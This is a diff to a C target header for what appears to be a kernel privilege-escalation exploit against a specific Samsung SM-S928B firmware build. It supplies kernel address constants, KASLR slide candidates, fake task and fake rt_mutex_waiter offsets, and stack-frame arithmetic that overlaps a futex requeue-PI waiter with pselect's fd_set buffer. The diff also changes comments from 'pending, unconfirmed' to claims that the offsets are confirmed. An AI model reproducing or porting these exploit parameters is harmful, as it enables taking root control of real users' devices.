@@ -3,11 +3,10 @@
 
 /* SM-S928B S928BXXU6EZIF. Firmware-dependent symbols live in target.h.
  *
- * Layout values are inherited from the SM-S928N EZIF profile on the same KMI
- * build (6.1.162-android14-11-34343818) unless a value carries its own measured
- * provenance. Anything marked pending must be confirmed against the exact
- * S928BXXU6EZIF Image and BTF before this target is built or run.
- * See docs/PORT-STATUS.md. */
+ * Offsets below were re-derived from the S928BXXU6EZIF Image: kallsyms for
+ * symbols, BTF for structures, disassembly for the syscall frames.  Values
+ * without that provenance are marked where they are defined.
+ * P0_KERNEL_PHYS_LOAD has no offline proof yet.  See docs/PORT-STATUS.md. */
 #define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
 #define P0_PAGE_OFFSET 0xffffff8000000000ULL
 /* memstart_addr, not "DRAM base".  util.c computes __pa() as
@@ -68,10 +67,13 @@
 /* Measured on the SM-S928B reference unit:
  * /sys/kernel/tracing/events/sched/sched_blocked_reason/id == 106. */
 /* This route leaves the waiter allocated by futex_wait_requeue_pi, not the
- * separate futex_lock_pi waiter.  The SM-S928N EZIF frames place it at syscall
- * entry-0x1e8, while core_sys_select places its fd-set buffer at entry-0x200.
- * The frame difference is inherited; re-derive it from this Image's
- * futex_wait_requeue_pi and core_sys_select disassembly. */
+ * separate futex_lock_pi waiter.  In this Image rt_mutex_init_waiter points
+ * the waiter's two rb-node self-addresses at futex_wait_requeue_pi.sp+0x98 and
+ * +0xb0, and the chain __arm64_sys_futex (0x70) -> do_futex (0x60) ->
+ * futex_wait_requeue_pi (0x1b0) puts that waiter at pt_regs-0x1e8.
+ * __arm64_sys_pselect6 (0x90) calls core_sys_select (0x1c0) directly and its
+ * fd_set_bits array is at core_sys_select.sp+0x50 = pt_regs-0x200, so global
+ * fd-set word 3 lands on the waiter. */
 #define SLIDE_PSELECT_WORD_SHIFT 3
 #define SLIDE_P0_OFFSET_CANDIDATES \
   0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
@@ -134,8 +136,8 @@
 #define LEFT_OFF 0x5550
 #define FAKE_TASK_OFF 0x3200
 
-/* EZIF BTF fields. Same KMI build as the SM-S928N profile; confirm against the
- * S928BXXU6EZIF BTF before the first write. */
+/* EZIF BTF fields.  This Image carries a BTF blob and it confirms each offset
+ * below, including rt_mutex_waiter's 0x58-byte layout. */
 #define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
 #define FAKE_WAITER_TASK_OFF 0x30
 #define FAKE_WAITER_LOCK_OFF 0x38
